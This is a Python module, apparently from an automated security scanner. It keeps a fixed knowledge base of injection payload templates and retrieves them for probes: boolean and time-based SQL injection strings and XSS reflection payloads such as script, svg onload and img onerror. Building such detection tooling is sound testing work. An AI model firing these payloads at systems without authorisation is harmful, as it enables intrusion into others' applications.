"""PayloadOracle — the retrieval half of a RAG payload system.

Playbooks must never hand-roll injection syntax inline; they ask the oracle. The oracle is a
curated, vetted knowledge base of payload *templates* keyed by ``(claim, technique)`` — the
"retrieval" in retrieval-augmented generation. Retrieval is deterministic (same request -> same
payloads), so a run is reproducible and a finding's PoC is exact. An LLM may later *rank* or
*mutate* what the oracle returns, but the syntax itself comes from this vetted store, never from
the model's imagination. That is what keeps injection findings trustworthy.

Core-only (stdlib): importable without the playbook deps, so it can be unit-tested in isolation.
"""
from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class Payload:
    """One rendered payload plus the metadata a validator needs to interpret the result."""

    technique: str                                    # boolean_true|boolean_false|time|reflection
    value: str
    meta: dict[str, str | int] = field(default_factory=dict)


# Curated knowledge base. Templates use ``{seed}`` (a benign base term), ``{delay}`` (seconds),
# and ``{marker}`` (a unique reflection token). Ordered best-first within each technique.
_KB: dict[tuple[str, str], list[str]] = {
    ("sqli", "boolean_true"): [
        "{seed}' OR '1'='1",
        "{seed}\" OR \"1\"=\"1",
        "{seed}') OR ('1'='1",
    ],
    ("sqli", "boolean_false"): [
        "{seed}' AND '1'='2",
        "{seed}\" AND \"1\"=\"2",
        "{seed}') AND ('1'='2",
    ],
    ("sqli", "time"): [
        "{seed}'; SELECT pg_sleep({delay})--",
        "{seed}' AND SLEEP({delay})--",
        "{seed}'; WAITFOR DELAY '0:0:{delay}'--",
    ],
    ("xss", "reflection"): [
        "<script>{marker}</script>",
        "\"><svg onload={marker}>",
        "<img src=x onerror={marker}>",
        "';{marker};//",
    ],
}


class PayloadOracle:
    """Deterministic retrieval over the vetted payload KB."""

    def retrieve(
        self, claim: str, technique: str, top_k: int = 3, **render: object
    ) -> list[Payload]:
        """Top-k vetted payloads for a ``(claim, technique)``, rendered with the given fields."""
        templates = _KB.get((claim, technique), [])[:top_k]
        meta = self._meta(technique, render)
        return [
            Payload(technique=technique, value=t.format(**render), meta=meta)
            for t in templates
        ]

    @staticmethod
    def _meta(technique: str, render: dict[str, object]) -> dict[str, str | int]:
        if technique == "time":
            raw = render.get("delay", 0)
            secs = int(raw) if isinstance(raw, int | str) else 0
            return {"expected_delay_ms": secs * 1000}
        return {}

    def sqli_boolean_pair(self, seed: str = "1") -> tuple[Payload, Payload]:
        """The (TRUE, FALSE) boolean-injection pair a boolean-based SQLi probe needs."""
        true_p = self.retrieve("sqli", "boolean_true", top_k=1, seed=seed)[0]
        false_p = self.retrieve("sqli", "boolean_false", top_k=1, seed=seed)[0]
        return true_p, false_p

    def sqli_time(self, seed: str = "1", delay: int = 5) -> Payload:
        """A single time-based payload with ``expected_delay_ms`` in its meta."""
        return self.retrieve("sqli", "time", top_k=1, seed=seed, delay=delay)[0]

    def xss_reflection(self, marker: str) -> list[Payload]:
        """Reflection payloads carrying a unique ``marker`` for verbatim-vs-escaped detection."""
        return self.retrieve("xss", "reflection", top_k=4, marker=marker)
